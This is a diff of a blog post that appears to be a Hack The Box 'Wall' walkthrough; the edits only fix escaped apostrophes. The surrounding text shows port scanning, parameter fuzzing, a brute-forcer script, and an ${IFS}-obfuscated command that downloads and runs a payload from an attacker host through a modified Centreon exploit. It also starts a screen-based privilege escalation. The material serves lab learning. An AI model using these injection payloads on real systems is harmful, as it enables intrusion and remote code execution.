@@ -42,7 +42,7 @@ Discovered open port 22/tcp on 10.10.10.157
 Discovered open port 80/tcp on 10.10.10.157
 ```
 
-Nothing interesting. Let\'s do one better with `nmap` scanning the discovered ports to establish their services.
+Nothing interesting. Let's do one better with `nmap` scanning the discovered ports to establish their services.
 
 ```
 # nmap -e tun1 -n -v -Pn -p22,80 -A --reason -oN nmap.txt 10.10.10.157
@@ -99,7 +99,7 @@ http://10.10.10.157/server-status (Status: 403)
 ===============================================================
 ```
 
-Interesting. A protected directory and two PHP files. Let\'s see what we get with `wfuzz` and some common Burp parameters.
+Interesting. A protected directory and two PHP files. Let's see what we get with `wfuzz` and some common Burp parameters.
 
 The file `aa.php` had two interesting parameters: `hostname` and `passwd`.
 
@@ -125,7 +125,7 @@ Filtered Requests: 2586
 Requests/sec.: 20.22950
 ```
 
-Too bad the parameters result in a `403 Forbidden`. It\'s worthy to note that `panel.php` had the same parameters with the same results. Let\'s see if other verbs work for the discovered directory and files.
+Too bad the parameters result in a `403 Forbidden`. It's worthy to note that `panel.php` had the same parameters with the same results. Let's see if other verbs work for the discovered directory and files.
 
 ```
 # wfuzz -w verbs.txt -w valid.txt -X FUZZ http://10.10.10.157/FUZ2Z
@@ -195,7 +195,7 @@ if grep -Evi bad <<<"$r" &>/dev/null; then
 fi
 ```
 
-Combined with GNU Parallel, you get a multi-threaded brute-forcer! Let\'s give it a shot.
+Combined with GNU Parallel, you get a multi-threaded brute-forcer! Let's give it a shot.
 
 <a class="image-popup">
 ![e777d4e3.png](/assets/images/posts/wall-htb-walkthrough/e777d4e3.png)
@@ -232,7 +232,7 @@ Replace the command in 47069 with the following command:
 wget${IFS}-O/tmp/vv${IFS}http://10.10.12.100/vv;${IFS}chmod${IFS}+x${IFS}/tmp/vv;${IFS}/tmp/vv
 ```
 
-Let\'s give it a shot!
+Let's give it a shot!
 
 ```
 # python exploit.py http://10.10.10.157/centreon admin password1 10.10.12.100 1234
@@ -246,7 +246,7 @@ Sweet.
 
 ## Privilege Escalation
 
-During enumeration of `www-data`\'s account, I noticed a vulnerable version of `screen` was installed.
+During enumeration of `www-data`'s account, I noticed a vulnerable version of `screen` was installed.
 
 <a class="image-popup">
 ![0c657cee.png](/assets/images/posts/wall-htb-walkthrough/0c657cee.png)
